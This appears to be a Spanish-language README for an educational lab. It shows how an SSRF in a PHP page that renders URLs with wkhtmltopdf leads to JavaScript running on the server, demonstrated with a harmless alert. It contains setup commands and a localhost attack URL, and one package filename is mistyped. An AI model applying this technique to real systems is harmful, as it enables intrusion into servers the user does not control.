# 💥 SSRF a XSS: Explotando la Generación de PDFs en el Servidor 📄

Este proyecto simula una cadena de vulnerabilidades: **Server-Side Request Forgery (SSRF)** escalando a **Cross-Site Scripting (XSS)**. El ataque se ejecuta a través de una aplicación web que usa `wkhtmltopdf` para generar PDFs.

---

## 🎯 Objetivo

Demostrar cómo una SSRF puede forzar a un componente de servidor (`wkhtmltopdf`) a ejecutar código (XSS) al procesar contenido externo.

---

## ⚙️ Componentes Necesarios

* **Sistema Operativo:** Kali Linux (o Debian/Ubuntu compatible)
* **Servidor Web:** Apache2 + PHP
* **Generador de PDFs:** `wkhtmltopdf` (versión 0.12.6.1-2, compilado para Bullseye)
* **Servidor Malicioso:** Python `http.server`

---

## 🚀 Preparación del entorno

### 1. Preparar el Entorno Base

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install apache2 php libapache2-mod-php -y
sudo systemctl start apache2 && sudo systemctl enable apache2
```

### 2. Instalar wkhtmltopdf (¡Atención a las Dependencias!)
La instalación de wkhtmltopdf puede dar problemas con **libssl1.1.** Sigue estos pasos exactos:

- Descargar wkhtmltopdf (versión Bullseye):

```bash
curl -LO https://github.com/wkhtmltopdf/packaging/releases/download/0.12.6.1-2/wkhtmltox_0.12.6.1-2.bullseye_amd64.deb
```

- Instalar wkhtmltopdf:

```bash
sudo dpkg -i wkhtmltox_012.6.1-2.bullseye_amd64.deb
```
(Es normal que aparezcan errores de dependencia aquí.)

- Instalar libssl1.1 (solución a la dependencia):

```bash
wget [http://ftp.debian.org/debian/pool/main/o/openssl/libssl1.1_1.1.1w-0+deb11u1_amd64.deb](http://ftp.debian.org/debian/pool/main/o/openssl/libssl1.1_1.1.1w-0+deb11u1_amd64.deb)
sudo dpkg -i libssl1.1_1.1.1w-0+deb11u1_amd64.deb
```

- Verificar wkhtmltopdf:

```bash
wkhtmltopdf -h
```
Si no hay errores, ¡está listo!

---

## 🚀 Comienza la simulación
1. Copia el fichero index.php a la ruta /var/www/html
```bash
sudo cp index.php /var/www/html
```
2. Levanta un servidor con Python donde se comparta el recurso malicious.html
```bash
python -m http.server
```
3. Ejecutar el Ataque (SSRF → XSS)
   
Abre tu navegador en Kali y accede a la URL de ataque:
``http://localhost/index.php?url=http://localhost:8000/malicious.html``

## ✅ Resultados y Confirmación de la Vulnerabilidad
Al ejecutar el ataque, la sección "Diagnóstico" en tu navegador mostrará:

``Warning: Javascript alert: XSS ejecutado!``

Esto confirma que el JavaScript se ejecutó en el motor de renderizado de wkhtmltopdf en el lado del servidor durante la generación del PDF.

Nota: No verás un pop-up en el PDF final. Esto es normal debido a las medidas de seguridad de los visores de PDF. La vulnerabilidad reside en la ejecución del JS en el servidor, no en el cliente.


## ⚠️ Advertencia de Seguridad Importante

**Solo para fines educativos.** No lo uses en sistemas de producción o sin permiso. Realiza todas las pruebas en una VM aislada.
